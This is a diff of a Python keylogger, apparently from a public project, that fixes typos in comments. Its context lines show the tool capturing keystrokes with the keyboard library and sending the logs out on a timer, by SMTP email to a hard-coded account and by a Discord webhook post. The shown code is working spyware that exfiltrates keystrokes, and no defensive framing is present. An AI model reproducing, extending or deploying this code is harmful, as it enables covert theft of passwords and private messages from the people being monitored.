@@ -1,5 +1,5 @@
 import keyboard # Imported to provide the ability to log keys
-import smtplib # Imported to provide the ability to send the recorded key logs though SMTP protocol for email
+import smtplib # Imported to provide the ability to send the recorded key logs through SMTP protocol for email
 
 from threading import Timer # Intended to make it possible to send reports have a set period of time
 from datetime import datetime # Imported to retrieve the current date times at certain periods of time
@@ -58,7 +58,7 @@ class MultiKeylogger:
         content.add_header('subject', subject)  # Sets the to header to the provided subject, which the time interval of the keylogger
         content.add_header('to', address) # Sets the to header to the provided address
         content.add_header('from', address)  # Sets the from header to the provided address
-        content.set_payload(contents) # Sets the body of the email to the contents, which is  self.keylog
+        content.set_payload(contents) # Sets the body of the email to the contents, which is self.keylog
         email.starttls() # Starts TLS for security
         email.login(address, password) # Logs into the email with provided address and password
         email.send_message(content, from_addr = address, to_addrs = [address]) # Sends the email 
@@ -79,7 +79,7 @@ class MultiKeylogger:
     def reportDiscord(self, discordBody, logTime):
         discordMessage = logTime + "\n" + discordBody # Creates string variable of log time interval and then on the next line the key logs
         data = {
-            "content": discordMessage, # Contend of the message
+            "content": discordMessage, # Contents of the message
             "username": "Keylogger" # Name of the bot/webhook
         }
         messagePost = requests.post(DISCORD_URL, json = data)
